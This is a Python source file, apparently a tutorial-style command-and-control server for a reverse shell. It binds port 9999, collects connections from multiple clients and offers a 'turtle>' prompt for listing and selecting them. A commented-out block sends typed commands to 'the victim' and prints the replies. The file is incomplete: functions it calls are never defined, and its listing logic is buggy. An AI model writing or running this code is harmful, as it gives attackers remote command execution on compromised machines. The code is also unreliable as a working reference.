import socket 
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS =2
JOB_NUMBER=[1,2]
queue =Queue()
all_connections=[]
all_address=[]



#creating socket
def create_socket():
   try:
    global host
    global port 
    global s
    host=""
    port= 9999
    s=socket.socket()
   except socket.error as msg:
       print("socket creation error:" +str(msg))


#binding the socket and listening for connection

def bind_socket():
    try:
        global host
        global port
        global s
        print("binding the port"+str(port))
         
        
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("Socket Binding Error"+str(msg)+"\n"+"Retrying....")
        bind_socket()

#establish a connection with client

"""
def socket_accept():
    conn,address =s.accept()
    print("connection has been established! |"+"IP"+address[0]+"| Port"+ str(address[1]))
    send_command(conn)
    conn.close()
#send command to the victim

def send_command(conn):
    while True:
        cmd=input()
        if cmd=='quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) >0:
            conn.send(str.encode(cmd))
            client_response=str(conn.recv(1024),"utf-8")
            print(client_response,end="")

def main():
    create_socket()
    bind_socket()
    socket_accept()          

main()

"""
#Handling connection from multiple clients and saving to a list

#closing previous connections 

def accepting_connection():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address =s.accept()
            s.setblocking(1) #PREVENTS TIMEOUT

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established :"+address[0])

        except:
            print("Error accepting connections")


# 2nd thread functions- 1) See all the clients 2) Select a client

# interactive prompt for sending commands

def start_turtle():
    cmd= input('turtle> ')

    if cmd== 'list':         # turtle> list     
        list_connections()

    elif 'select' in cmd:
       conn= get_target(cmd)
       if conn is not None:
           send_target_commands(conn)  

    else:
        print("Command not recognized")

# Display all current active connections with the client

def list_connections():
    results=''
    selectId =0 
    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results= str(i) + " "+str(all_address[i][0])+" "+str(all_address[i][1]) +"\n"
        
    print('-----clients-----'+'\n'+ results)
    
